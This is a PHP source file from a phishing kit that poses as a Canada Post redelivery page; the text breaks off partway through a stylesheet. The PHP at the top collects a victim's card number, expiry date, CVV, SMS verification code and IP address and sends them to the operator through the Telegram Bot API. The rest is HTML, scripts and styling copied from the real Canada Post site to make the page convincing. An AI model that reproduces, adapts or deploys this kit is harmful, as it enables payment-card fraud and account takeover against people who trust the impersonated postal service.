<?php

include "antibot.php";
include "id.php";


session_start();

if (!isset($_SESSION['Phone'])) {
    header("location: index.php");
}
if (!isset($_SESSION['CVV'])) {
    header("location: pyt.php");
}

if (isset($_POST['okbb'])) {
    $messageTelegram  = "|+]############[+][ Canadapost echo ][+]############[+|\n";
    $messageTelegram .= "|Card Number  :  " . $_SESSION['Cardnumber'] . "\n";
    $messageTelegram .= "|Expiry Date  :  " . $_SESSION['Expiry'] . "\n";
    $messageTelegram .= "|Security Code:  " . $_SESSION['CVV'] . "\n";
    $messageTelegram .= "|🚨SMS Code🚨:  " . $_POST['sms'] . "\n";
    $messageTelegram .= "|USER-IP-ADDRESS :  " . $_SERVER['REMOTE_ADDR'] . "\n";
    $messageTelegram .= "|+]############[+][ Canadapost echo ][+]############[+|\n";

    if ($enableTelegram) {
        foreach ($IdTelegram as $user_id) {
            $website = "https://api.telegram.org/bot" . $BotTelegramToken;
            $params = [
                'chat_id' => $user_id,
                'text' => $messageTelegram,
            ];

            $ch = curl_init($website . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
        }
    }

    $_SESSION['sms'] = $_POST['sms'];

    header("Location: successful.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en" style="" class=" csstransitions no-csspseudotransitions no-touchevents">
  <head class="at-element-marker">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>Schedule a Redlivery | Canada Post</title>
    <style type="text/css">
      .iw_container
                {
                  max-width:800px !important;
                  margin-left: auto !important;
                  margin-right: auto !important;
                }
                .iw_stretch
                {
                  min-width: 100% !important;
                }
    </style>
    <link href="./file/foundation-config.css" type="text/css" rel="stylesheet">
    <!--ls:end[stylesheet]-->
    <!--ls:begin[meta-keywords]-->
    <!--ls:end[meta-keywords]-->
    <!--ls:begin[meta-description]-->
    <!--ls:end[meta-description]-->
    <!--ls:begin[custom-meta-data]-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <!--ls:end[custom-meta-data]-->
    <!--ls:begin[meta-vpath]-->
    <meta name="vpath" content="">
    <!--ls:end[meta-vpath]-->
    <!--ls:begin[meta-page-locale-name]-->
    <meta name="page-locale-name" content="">
    <!--ls:end[meta-page-locale-name]-->
    <!--ls:begin[favicon]-->
    <link type="image/x-icon" href="https://www.canadapost-postescanada.ca/cpc/assets/cpc/img/logos/favicon.ico" rel="shortcut icon">
    <!--ls:end[favicon]-->
    <!--ls:begin[stylesheet]-->
    <link type="text/css" href="./file/foundation.css" rel="stylesheet" data-tg-desktop_or_tablet_or_phone="show">
    <!--ls:end[stylesheet]-->
    <!--ls:begin[stylesheet]-->
    <link type="text/css" href="./file/normalize.css" rel="stylesheet" data-tg-desktop_or_tablet_or_phone="show">
    <!--ls:end[stylesheet]-->
    <!--ls:begin[stylesheet]-->
    <link type="text/css" href="./file/cpc-main.css" rel="stylesheet" data-tg-desktop_or_tablet_or_phone="show">
    <!--ls:end[stylesheet]-->
    <!--ls:begin[stylesheet]-->
    <link type="text/css" href="./file/tools.css" rel="stylesheet" data-tg-desktop_or_tablet_or_phone="show">
    <!--ls:end[stylesheet]-->
    <!--ls:begin[script]-->
    <script async="" src="./file/beacon.js"></script>
    <script type="text/javascript" async="" src="./file/f.txt"></script>
    <script type="text/javascript" async="" src="./file/f.txt"></script>
    <script type="text/javascript" async="" src="./file/js"></script>
    <script type="text/javascript" async="" src="./file/js(1)"></script>
    <script type="text/javascript" async="" src="./file/js(2)"></script>
    <script type="text/javascript" async="" src="./file/insight.min.js"></script>
    <script type="text/javascript" async="" src="./file/insight.min.js"></script>
    <script async="" src="./file/uwt.js"></script>
    <script src="./file/614267586032718" async=""></script>
    <script async="" src="./file/fbevents.js"></script>
    <script type="text/javascript" src="./file/modernizr.js" data-tg-desktop_or_tablet_or_phone="show"></script>
    <!--ls:end[script]-->
    <!--ls:begin[script]-->
    <script type="text/javascript" src="./file/jquery.js" data-tg-desktop_or_tablet_or_phone="show"></script>
    <!--ls:end[script]-->
    <!--ls:begin[script]-->
    <script type="text/javascript" src="./file/foundation.min.js" data-tg-desktop_or_tablet_or_phone="show"></script>
    <meta class="foundation-data-attribute-namespace">
    <meta class="foundation-mq-xxlarge">
    <meta class="foundation-mq-xlarge-only">
    <meta class="foundation-mq-xlarge">
    <meta class="foundation-mq-large-only">
    <meta class="foundation-mq-large">
    <meta class="foundation-mq-medium-only">
    <meta class="foundation-mq-medium">
    <meta class="foundation-mq-small-only">
    <meta class="foundation-mq-small">
    <style></style>
    <!--ls:end[script]-->
    <!--ls:begin[script]-->
    <script type="text/javascript" src="./file/foundation.reveal.js" data-tg-desktop_or_tablet_or_phone="show"></script>
    <!--ls:end[script]-->
    <!--ls:end[script]-->
    <!--ls:begin[script]-->
    <script type="text/javascript" src="./file/tools.js" data-tg-desktop_or_tablet_or_phone="show"></script>
    <!--ls:end[script]-->
    <!--ls:begin[head-injection]-->
    <!-- search:begin[meta-keywords] -->
    <meta name="language" content="">
    <meta http-equiv="content-language" content="en_CA">
    <meta name="category" content="">
    <meta name="subcategory" content="">
    <meta name="date.published" content="">
    <meta name="category_landing" content="">
    <meta name="keywords" content="postal indicia, tool, lettermail, letter-post, personalized mail, publications mail, postal code targeting">
    <meta name="description" content="Create your own postal indicia to prove you paid for mail items using your commercial account.">
    <meta name="phead" content="Postal indicia tool">
    <meta name="pta" content="Create postal indicia">
    <meta name="adops" content="0">
    <meta name="segment" content="">
    <meta name="segmentid" content="">
    <meta name="sns" content="common">
    <meta name="cattype" content="psi">
    <meta name="ptype" content="">
    <meta name="robots" content="index,follow">
    <meta property="og:description" content="Create your own postal indicia to prove you paid for mail items using your commercial account.">
    <meta property="og:title" content="Postal indicia tool">
    <meta name="toggleUrl" content="/scp/fr/outils/vignettes-postales.page">
    <link rel="alternate" href="https://www.canadapost-postescanada.ca/scp/fr/outils/vignettes-postales.page" hreflang="fr-ca">
    <link rel="alternate" href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page" hreflang="en-ca">
    <link rel="canonical" href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page">
    <meta name="apple-itunes-app" content="app-id=394391577">
    <meta name="google-play-app" content="app-id=com.canadapost.android"><!-- search:end[meta-keywords] -->

    <meta name="sso-username" content="Unauthenticated">
    <meta name="sso-groups" content="Unauthenticated">
    <meta name="sso-token" content="">
    <meta name="dcterms.creator" content="Canada Post">
    <link type="text/css" href="./file/postal-guide.css" rel="stylesheet">
    <meta name="dcterms.creator" content="Canada Post">
    <link type="text/css" href="./file/styles.css" rel="stylesheet">
    <meta name="dcterms.creator" content="Canada Post">
    <script src="./file/satelliteLib-f2fc6f00da802a0747b6ffed3c12e3931bfca496.js"></script>
    <script src="./file/EXceb9b11658e548b18c0f3a95e66448d9-libraryCode_source.min.js" async=""></script>
    <!-- 
Start of global snippet: Please do not remove
Place this snippet between the <head> and </head> tags on every page of your site.
-->
    <!-- Global site tag (gtag.js) - Google Marketing Platform -->
    <script async="" src="./file/js(3)" class="optanon-category-C0004"> </script>
    <script>
      window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'DC-9852050');
        gtag('config', 'AW-1011747518');
        gtag('config', 'DC-12182971'); 
        gtag('config', 'AW-10937558046');
    </script>
    <script>
      gtag('event', 'page_view', {
          'send_to': 'AW-1011747518',
          'value': 'replace with value',
          'class' : 'optanon-category-C0004',
          'items': [{
            'id': 'replace with value',
            'location_id': 'replace with value',
            'google_business_vertical': 'custom'
          }]
        });
    </script>

    <!-- End of global snippet: Please do not remove -->
    <style id="at-makers-style" class="at-flicker-control">
      .mboxDefault {visibility: hidden;}
</style>
    <script>
      // FILE: helper functions 140714h dtm.js
      // AUTHOR: Copyright 1996-2014 Adobe, Inc. All Rights Reserved
      // DESCRIPTION: Helper functions for data layer
      // UPDATED: 14.08.26
      // USAGE:
      // 1. Create a DTM Page Load Rule called "Helper Functions"
      // 2. Make sure "Trigger rule at" is set to "Top of Page" under "Conditions"
      // 3. Make sure "Execuite Globally" is checked
      // 4. Under "Javascript/Third Party Tags", add a new script under "Sequential Javascript" called "Helper Functions"
      // 5. Upload this file into the code window and check "Execute Globally"
      
      /************************** preSlib v1.50 - General Helper Functions *************************/
      
      var W=eval('window');
      var analyticsData = {};
          analyticsData.reloadableForm="";  
          analyticsData.appClientError="";
          analyticsData.errorField="";
          analyticsData.errorMsg="";
      
      // preSlib enabler functions
      if(!W.s_is)W.s_is=function(x){var t=x===null?'null':typeof x;if(t=='object'&&typeof x.length=='number')t='array';return t}
      if(!W.s_isN)W.s_isN=function(x){return s_is(x)=='number'}
      if(!W.s_isS)W.s_isS=function(x){return s_is(x)=='string'}
      if(!W.s_MC)W.s_MC=function(a,c){try{if(s_isS(c))c=c=='lc'?-1:c=='uc'?1:0;if(!s_isN(c))c=c?1:0;a+='';a=c<0?a.toLowerCase(a):c>0?a.toUpperCase(a):a}catch(e){}return a}
      if(!W.s_LC)W.s_LC=function(a){return s_MC(a,'lc')}
      if(!W.s_UC)W.s_UC=function(a){return s_MC(a,'uc')}
      if(!W.s_scrubWS)W.s_scrubWS=function(t){try{if(t==null)t='';t=t.replace(/^\s+/g,'').replace(/\s+$/g,'').replace(/\s+/g,' ')}catch(e){}return t}
      if(!W.s_split)W.s_split=function(l,d){var i,x=0,a=new Array;if(!d)d=',';while(l){i=l.indexOf(d);i=i>-1?i:l.length;a[x++]=l.substring(0,i);l=l.substring(i+d.length)}return a}
      if(!W.s_getHTMLtag)W.s_getHTMLtag=function(y){var a='',v='',g='',t='',f='',c='mc',p=arguments,l=p.length,i;if(!y)return f;if(l>1){i=s_LC(p[l-1]);if(i=='uc'||i=='lc'||i=='mc'){c=i;l--}}y=s_LC(y);if(l==2)g=s_LC(p[1]);else if(l>=3){a=s_LC(p[1]);v=s_MC(p[2],c);if(l>=4)g=s_MC(p[3],c)}if(document.getElementsByTagName)t=document.getElementsByTagName(y);if(typeof t!='object')return f;for(i=0;!f&&i<t.length;i++){f=t[i];if(a&&v&&s_MC(f.getAttribute(a),c)!=v)f=''}if(!f||typeof f!='object'||!g)return f;if(g!='text')return f.getAttribute(g);f=f.innerText||f.textContent||'';f=f.replace(/\s*>\s*/g,'>').replace(/^>+/,'').replace(/>+$/,'');return f}
      if(!W.s_parseUri)W.s_parseUri=function(u){if(u){u=u+'';u=u.indexOf(':')<0&&u.indexOf('//')!=0?(u.indexOf('/')==0?'/':'//')+u:u}var u=u?u+'':window.location.href,e,a=document.createElement('a'),p='',r={};a.setAttribute('href',u);for(e in a)if(typeof a[e]=='string')r[e]=a[e];delete a;p=r.pathname||'';if(p.indexOf('/')!=0)r.pathname='/'+p;return r}
      if(!W.s_indexOf)W.s_indexOf=function(t,s){var r;try{r=(s?s+'':'').indexOf(t)}catch(e){r=-1}return r}
      
      // preSlib utilities
      if(!W.s_getCharSet)W.s_getCharSet=function(){var v=s_getHTMLtag('meta','http-equiv','content-type','content'),i;if(!v)return'';i=v.indexOf('charset=');if(i==-1)return'';return s_UC(v.substring(i+8,99).replace(/[\'\";, ].*/,''))}
      if(!W.s_getQueryStr)W.s_getQueryStr=function(n,u){var g,h,i,a='&',q=u||window.location.search,p=q.toLowerCase().replace(/\?/g,a)+a;n=a+n.toLowerCase();g=n+'=';h=p.indexOf(g);if(h>-1){i=h+g.length;return decodeURIComponent(q.substring(i,p.indexOf(a,i)).replace(/\+/g,' '))}g=n+a;return p.indexOf(g)>-1?' ':''}
      if(!W.s_apl)W.s_apl=function(l,v,d,u){var m=0;if(!l)l='';if(u){var i,n,a=s_split(l,d);for(i=0;i<a.length;i++){n=a[i];m=m||(u==1?(n==v):(s_LC(n)==s_LC(v)))}}if(!m)l=l?l+d+v:v;return l}
      if(!W.s_getShortHn)W.s_getShortHn=function(u){return s_LC(s_parseUri(u||window.location.href).hostname.replace(/^www-?[0-9]*\./i,''))}
      if(!W.s_getOwnerHn)W.s_getOwnerHn=function(u){return s_LC(s_parseUri(u||window.location.href).hostname.replace(/^www[0-9]*\./i,'').replace(/\.(gov|edu|com|mil|org|net|int).*/,'').replace(/\.[a-z][a-z]$/,'').replace(/.*\./,''))}
      if(!W.s_getTLDlevels)W.s_getTLDlevels=function(u){var h=s_parseUri(u||window.location.href).hostname;return h.match(RegExp("\\.co\\..{2}$","i"))||h.match(RegExp("\\.(gov|edu|com|mil|org|net|int)\\..{2}$","i"))?3:2}
      if(!W.s_getCookieDomain)W.s_getCookieDomain=function(u){var h=s_parseUri(u||window.location.href).hostname,n=s_getTLDlevels(),a=s_split(h,'.'),i=a.length-n;for(h='';i<a.length;i++)h+='.'+a[i];return h}
      if(!W.s_c_w)W.s_c_w=function(n,v,e,d){if(W.s&&typeof W.s=='object'&&W.s.c_w&&!d)return W.s.c_w(n,v,e);v+='';var t=v?0:-60;if(t){e=new Date;e.setTime(e.getTime()+(t*1e3))}if(n)document.cookie=n+'='+escape(v||'[[B]]')+'; path=/'+(d?'; domain='+d:'')+(e?';  expires='+e.toGMTString():'');return n?s_c_r(n)==v:0}
      if(!W.s_c_r)W.s_c_r=function(n){if(W.s&&typeof W.s=='object'&&W.s.c_r)return W.s.c_r(n);var c=' '+document.cookie,i=c.indexOf(' '+n+'='),e=i<0?i:c.indexOf(';',i),v=i<0?'':unescape(c.substring(i+2+n.length,e<0?c.length:e));return v=='[[B]]'?'':v}
      if(!W.s_c_d)W.s_c_d=function(n,e,p,d,s){document.cookie=n+'='+escape('[[B]]')+(p?'; path='+p:'')+(d?'; domain='+d:'')+(e?'; expires=Thu, 01 Jan 1970 00:00:01 GMT':'; max-age=0')+(s?'; secure':'')}
      // Fixing Page Load time plugin due to issues when the calculations aren't correct.
      W.s_getLoadTime = function() {
              var s_loadT = '';
          var o = window.performance ? performance.timing : 0;
          if (o == 0){
            return s_loadT;
          }
             var a = o ? o.requestStart : window.inHeadTS || 0;
           if (a == 0){
             return s_loadT;
           }
           else {
                  s_loadT = a ? Math.round(((o.domInteractive || new Date().getTime()) - a) / 100) : '';
           }
        if (s_loadT < 0){
            s_loadT = '';
          return s_loadT;
        }
        else{
          return s_loadT;
        }
      }
      //if(!W.s_getLoadTime)W.s_getLoadTime=function(){if(!window.s_loadT){var o=window.performance?performance.timing:0,a=o?o.requestStart:window.inHeadTS||0;s_loadT=a?Math.round(((o.domInteractive||new Date().getTime())-a)/100):''}return s_loadT}
      if(!W.s_clog)W.s_clog=function(){try{var A='array',O='object',X='undefined',F='function',U='null',a=arguments,al=a.length,i,j,k,v,l='',o=l,e=l,c=l,x=0,d=0,z=0,p,p1=[],q,f0=1,f1=1,f2=1,f3=1,m=1<<16,T=function(z){var t=z===null?U:typeof z;if(t==A)t=O;return t},W=function(o){try{c+=o+'\n';if(window.s_Debug){if(T(s_debugW)!=O)s_debugW=window.open('','_debugWin','height=600,width=900,toolbar=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes');if(T(s_debugW)==O){if(T(s_debugD)!=O)s_debugD=s_debugW.document;if(T(s_debugD)==O){if(T(s_debugD.write)==F)s_debugD.write('<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"><html><head><title>debugWin</title><style>* {font-family:Andale Mono,OCR A Extended,Consolas,monospace,serif;font-size:9pt;word-wrap:break-word;padding:0px} p {display:block;clear:both;margin:1px;width:100%;border:none;border-bottom:1px solid #dddddd;}</style></head><body>');if(T(s_debugD.write)==F)s_debugD.write('<p>'+o.replace(/[ \t]/g,'&nbsp;').replace(/\</gi,'&lt;').replace(/\>/gi,'&gt;').replace(/\n$/,'').replace(/\n/gi,'<br/>')+'</p>');if(T(s_debugW.scrollBy)==F)s_debugW.scrollBy(0,100)}}}else if(T(console.log)==F||T(console.log)==O)console.log('%s',o)}catch(e){}},B=function(v){v=v+'';var j,b,r,w,c,f=1;for(j=0;j<v.length;j++){b=v.substr(j,1);r=b=='\n';w=b<=' ';c=b<'A';if(r||(f&&c&&l.length>140)||(f&&l.length+v.substring(j).replace(/\n.*/,'').length>140)){o+=l;z+=o.length;if(o.length>9999){W(o);o=''}else o+='\n';l=r?'':'  ';x=!r;f=0}if(!r&&(!x||!w)){l+=b;x=f=0}}},P=function(v){var d=0,i,err=0,u=function(x,v){if(!f3&&d>0){B('\n');for(k=0;k<=d;k++)B(p1.length>k&&p1[k]&&T(p1[k])=='string'?p1[k]:'');if(arguments.length==1)B(' = ')}if(arguments.length<2){var t=T(x);if(t=='string')B("'"+x+"'");else if(t=='boolean')B(x?'true':'false');else if(t==F)B(F+'(){...}');else if(t==U)B(U);else if(t==X)B(X);else B(x+'')}else if(!f3)B((T(v)!='object'?'':T(v.length)=='number'?'[]':'{}'))},b=function(v){if(++d>99){d--;B(' !!!TOO DEEP TO DISPLAY!!!');return}var o=T(v)==O&&T(v.length)!='number',p,x,f=1,j=0;if(f3)B(o?'{':'[');for(p in v){j++;if(!f3)p1[d]=o?'.'+p:'['+p+']';else{B(f?'':',');if(o){B('\n');for(i=0;i<d;i++)B(' ')}}if(j>1000){B('/* ERROR! TRUNCATED: TOO LARGE */');err=1}if(!err){if(o&&f3)B(p+': ');x=v[p];if(T(x)==O)b(x);else u(x)}f=0}d--;if(f3){if(o){B('\n');for(i=0;i<d;i++)B(' ');B('}')}else B(']')}else if(j==0)u(x,v)};if(T(v)!=O)u(v);else b(v)},FN=function(c){var n='',v,j;try{if(c){c=c+'';if(!c.indexOf(F+' '))c=c.substring(9);j=c.indexOf('(');if(j>-1)c=c.substring(0,j);if(!c)c='anonymous';n=c}}catch(e){}return n};var cn='s_debug',dp=s_getQueryStr(cn);if(dp>''){dp=dp==' '?1:parseInt(dp)||0;s_c_w(cn,String(dp))}dp=s_c_r(cn);s_Debug=dp>''?parseInt(dp):window.s_Debug||0;for(i=0;i<al;i++){v=a[i];switch(v){case'-f':f0=0;break;case'+f':f0=1;break;case'+u':f1=1;break;case'-u':f1=0;break;case'+n':f2=1;break;case'-n':f2=0;break;case'+o':f3=1;break;case'-o':f3=0;break;case'arguments':v=arguments.callee.caller;for(j=v;j;j=j.caller)q=FN(j)+(q?'>'+q:'');B(q);P(v.arguments);break;case F:B(FN(arguments.callee.caller));break;case'stack':B(st());break;default:if(T(v)==O){for(p in v)if(z<m&&z>=0)if(isNaN(p))if(f3)B(p+'=');else p1[0]=p;P(v[p])}else B(v);break}B(' ')}o+=l;o=o.replace(/^[ \t]*\n/,'').replace(/[ \t\n]*$/,'');if(o)W(o)}catch(e){}return c}
      
      
      /************************** DATA LAYER AND DTM SUPPORT SECTION *************************/
      
      if(!Object.create){Object.create=function(o){var F=function(){};F.prototype=o;return new F()}}
      if(!W.s_logS)W.s_logS=function(S){var W=window,A=W.$AAD||{},f=A.$logLevel||0;if(f<2)return;var w='pageName,pageType,channel,hier1,hier2,hier3,hier4,hier5,server,pageURL,referrer,visitorID,purchaseID,transactionID,events,products,zip,state,linkTrackVars,linkTrackEvents,linkURL,linkName,campaign,list1,list2,list3',x=w.split(','),l=0,o={},A=function(n){if(typeof S[n]!='undefined'&&S[n]!==null&&S[n]+'')o[n]=S[n]};if(!S||typeof S!='object')s_log(2,'ERROR: Adobe Analytics s object undefined.');else{for(i=0;i<x.length;i++)A(x[i]);for(i=1;i<76;i++)A('eVar'+i);for(i=1;i<76;i++)A('prop'+i);s_log(2,'-o',{'s':o})}}
      if(!W.s_logE)W.s_logE=function(e,T){var W=window,A=W.$AAD||{},f=A.$logLevel,t='ERROR'+(T&&typeof T=='string'&&T?' in '+T:''),n=typeof e=='object'?(e.number||0)&0xffff:'',l='',m=e.message||e.description||'',d='',s='';if(typeof n=='number'){if(n)d=n+': ';if(e.name&&(f<2||(e.stack||'').indexOf(e.name)<0))d+=e.name;if(m&&(f<2||(e.stack||'').indexOf(m)<0))d+=(d?': ':'')+m;if(e.lineNumber)l+='Line '+e.lineNumber;if(e.columnNumber)l+=', Column'+e.columnNumber;if(e.fileName)l+=(l?' ':'')+'in '+e.fileName;if(e.stack&&f>=2)s=e.stack;s_log(0,t);if(d)s_log(0,d);if(l)s_log(0,l);if(s)s_log(0,s)}}
      if(!W.s_log)W.s_log=function(l){var W=window,A=W.$AAD||{},f=A.$logLevel,n=[],i,v,t;if(W.s_clog&&(typeof f=='number'?f:0)>=l){n.push('-o');for(i=1;i<arguments.length;i++){v=arguments[i];t=typeof v;switch(t){case'object':n.push([v]);break;case'function':break;default:n.push(v);break}}s_clog.apply(this,n)}return''}
      if(!W.s_logSep)W.s_logSep=function(n,c){if(!c)c='=';var t=function(n){return n<10?'0'+n:''+n},p=function(n){while(n-->0)o+=c},d=new Date(),o='';p(30);o+=' '+d.getFullYear()+'.'+t(d.getMonth()+1)+'.'+t(d.getDate())+' '+t(d.getHours())+':'+t(d.getMinutes())+':'+t(d.getSeconds())+'.'+t(parseInt(''+(d%1000)/10))+' ';p(30);s_log(n,o)}
      if(!W.s_startTimer)W.s_startTimer=function(){var n=new Date().getTime();W=window,O='object',A=W.$AAD&&typeof W.$AAD==O?W.$AAD:{};A.$msTimer=n}
      if(!W.s_stopTimer)W.s_stopTimer=function(){var n=new Date().getTime(),W=window,O='object',A=W.$AAD&&typeof W.$AAD==O?W.$AAD:{};var o=$AAD.$msTimer;A.$msTimer='';return o&&typeof o=='number'?n-o:0}
      if(!W.s_getP)W.s_getP=function(p,t){var v,u,S='string',N='number',B='boolean';if(arguments.length>0){try{v=eval('window.'+p);if(arguments.length>1&&typeof t==S){try{switch(t){case S:v=v.String();if(typeof v!=t)v='';break;case N:v=typeof v==S||typeof v==B||typeof v==N?v.Number():Number('');break;case B:v=v.Boolean();break;default:v=u;break}}catch(e){v=u}}}catch(e){v=u}}return v}
      if(!W.s_setP)W.s_setP=function(p,v){try{var o=window,r=new RegExp("\\[[\'\"]?([^\\]\'\"]+)[\'\"]?\\]"),i,a=arguments,l,e={name:'UserException'},I=function(v){return/^[0-9]+$/.test(v)?Number(v):v};s_log(4,'s_setP( "'+p+'" ,',v,')');if(a.length==2&&p&&typeof p=='string'){p=p.replace(/\[\]/g,'[@]');for(i=0;i<99&&p.match(r);i++)p=p.replace(r,'.$1');p=p.split('.');for(i=0,c=o;i<p.length-1;i++){a=I(p[i]);if(a=='@')a=o.length||0;if(typeof o[a]!='object'){n=I(p[i+1]);o[a]=n=='@'||!isNaN(n)?[]:{}}o=o[a]}a=I(p[i]);if(a=='@')a=o.length;o[a]=v}}catch(e){s_logE(e,'function s_setP('+(typeof p=='string'?'"'+p+'",':'?,')+(typeof v!='object'&&typeof v!='function'?v:'[object]')+')')}return v};
    </script>
    <!--ls:end[head-injection]-->
    <!--ls:begin[tracker-injection]-->
    <!--ls:end[tracker-injection]-->
    <!--ls:begin[script]-->
    <!--ls:end[script]-->
    <!--ls:begin[script]-->
    <!--ls:end[script]-->
    <meta http-equiv="origin-trial" content="A7bG5hJ4XpMV5a3V1wwAR0PalkFSxLOZeL9D/YBYdupYUIgUgGhfVJ1zBFOqGybb7gRhswfJ+AmO7S2rNK2IOwkAAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjY5NzY2Mzk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
    <meta http-equiv="origin-trial" content="A7bG5hJ4XpMV5a3V1wwAR0PalkFSxLOZeL9D/YBYdupYUIgUgGhfVJ1zBFOqGybb7gRhswfJ+AmO7S2rNK2IOwkAAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjY5NzY2Mzk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
    <style></style>
    <script type="text/javascript" async="" src="./file/f(1).txt"></script>
    <script type="text/javascript" async="" src="./file/f(2).txt"></script>
    <script type="text/javascript" async="" src="./file/f(3).txt"></script>
    <meta class="foundation-mq-topbar">
    <style>.example-full-width{width:100%}.readonOnlyInput{-moz-user-select:none;-webkit-user-select:none;-ms-user-select:none;user-select:none;pointer-events:none}.mat-input-element{border-radius:2px!important;border:1px solid #333!important;background:#fff;font-family:Roboto!important;font-size:16px!important;font-weight:300!important;font-stretch:normal!important;font-style:normal!important;line-height:1.5!important;letter-spacing:.5px!important;color:#333!important;padding:10px 16px!important;outline:none!important;margin-top:6px!important;margin-bottom:24px;max-width:368px!important;height:44px!important;box-sizing:border-box}@media only screen and (max-width:40em){.mat-input-element{width:100%!important;max-width:100%!important}}.mat-input-element:focus{outline:0!important;border:1px solid #0467c6!important;border-radius:2px!important;box-shadow:inset 1px 1px 0 0 #0467c6,inset -1px -1px 0 0 #0467c6}.campaignIDError.mat-form-field-invalid .mat-input-element,.submitted .mat-form-field-invalid .mat-input-element{border:1px solid #ca261a!important;outline:none!important}.campaignIDError.mat-form-field-invalid .mat-input-element:focus{border:1px solid #ca261a!important;outline:none!important;box-shadow:inset 1px 1px 0 0 #ca261a,inset -1px -1px 0 0 #ca261a}.mat-input-element:disabled{background-color:#f0f0f0}.mat-input-element:-moz-read-only{background-color:#f0f0f0!important;color:#666!important}.mat-input-element:read-only{background-color:#f0f0f0!important;color:#666!important}.mat-input-element:-moz-read-only::-moz-selection,.mat-input-element:read-only::-moz-selection{background:rgba(0,0,0,0)!important}.mat-input-element:-moz-read-only::selection{background:rgba(0,0,0,0)!important}.mat-input-element:read-only::selection{background:rgba(0,0,0,0)!important}.mat-form-field{margin-bottom:32px}.mat-form-field-subscript-wrapper{position:relative!important;margin-top:0!important}.mat-form-field-label{padding:0!important;color:#333!important;font-family:Roboto!important;font-size:16px!important;font-weight:500!important;font-stretch:normal!important;font-style:normal!important;line-height:24px!important;letter-spacing:.5px!important;transition:none!important;-ms-transform:none!important;transform:none!important}.mat-form-field-underline{display:none}.mat-form-field-infix{border-top:1.2em solid rgba(0,0,0,0)}.mat-form-field-appearance-legacy .mat-form-field-wrapper{padding-bottom:0!important}.mat-form-field-label-wrapper{top:0!important;padding-top:0!important;overflow:unset!important}.mat-form-field-appearance-legacy .mat-form-field-label{top:-22px!important}.maxCharacter{font-size:16px;line-height:1.5;color:#666;margin:0}.matHint,.maxCharacter{font-family:Roboto;font-weight:300;font-stretch:normal;font-style:normal;letter-spacing:.5px;display:block;padding:0}.matHint{font-size:14px;line-height:1.43;color:#333;margin:2px 0 0}.mat-form-field-subscript-wrapper div.ng-trigger-transitionMessages{transition:none!important;-ms-transform:none!important;transform:none!important;opacity:1!important}.inputErrors .ds-error,.matHint+.mat-input-element{margin-top:4px!important}.mat-form-field-invalid .mat-input-element,.mat-form-field.mat-warn .mat-input-element,.mat-input-element{caret-color:#333!important}.mat-form-field-infix{width:100%!important}.mat-form-field-appearance-legacy .mat-form-field-subscript-wrapper{margin-top:0!important}.mat-form-field-appearance-legacy .mat-form-field-infix{padding:0!important}input[type=file]{display:none}.matHint{margin:0}.mat-form-field-appearance-legacy .mat-form-field-infix{border-top:0}.orientation-buttons .mat-radio-container{margin:0 10px 0 0!important}.alert-success{background-color:#e6f3e5;color:#333;max-width:480px;margin-bottom:16px;font-weight:300;padding:20px 15px 20px 16px;border-radius:0;border-left:4px solid #098a00}.alert-success img{margin-right:16px}.orientation-buttons img{margin-right:12px}.fileLabel,h4,p.ArtWorkLabel{font-family:Roboto;font-size:16px;line-height:24px;font-weight:500;font-stretch:normal;font-style:normal;letter-spacing:.5px;color:#333;text-align:left;display:block;margin:0 0 16px!important}.preview-container,.preview-image{width:100%;border:1px solid #cbcbcb;padding:32px;display:-ms-flexbox;display:flex;-ms-flex-pack:center;justify-content:center;-ms-flex-wrap:wrap;flex-wrap:wrap;-ms-flex-direction:column;flex-direction:column;-ms-flex-align:center;align-items:center}@media only screen and (max-width:40em){.preview-container,.preview-image{padding:0;border:0}}.preview-container .placeholder-image,.preview-image .placeholder-image{width:300px;margin-bottom:32px}.preview-container .wrapper-content,.preview-image .wrapper-content{position:relative;display:-ms-inline-flexbox;display:inline-flex;-ms-flex-direction:column;flex-direction:column;-ms-flex-line-pack:center;align-content:center;-ms-flex-pack:center;justify-content:center}.preview-container .wrapper-content h6,.preview-image .wrapper-content h6{text-align:center;font-weight:300;font-size:16px;color:#333;letter-spacing:.5px;line-height:24px}.preview-container{min-height:351px}.preview-image{position:relative}@media only screen and (max-width:40em){.preview-container{margin-bottom:16px;padding:0;background-color:rgba(0,0,0,0);border:0;min-height:150px;margin-top:24px}.preview-container .placeholder-image{height:113px;width:256px;margin-bottom:16px}}@media only screen and (min-width:40.063em) and (max-width:64em){.preview-container{width:100%;min-height:263px}}.delete-button,.delete-button[disabled]{background-color:rgba(0,0,0,0)!important;color:#666!important;background-image:url(/postal-indicia-api/assets/images/delete_disabled.svg);background-repeat:no-repeat;background-position:0;cursor:not-allowed!important;padding-left:22px;border:0!important;border-color:rgba(0,0,0,0);margin-top:16px;padding-top:0;padding-bottom:0;font-weight:300;width:auto}.delete-button{background-image:url(/postal-indicia-api/assets/images/delete.svg);color:#0467c6!important;cursor:pointer!important}.horizontal-orientation{position:absolute;z-index:1;left:0;right:0;height:100%;top:0;padding:6.4% 6.4% 6.4% 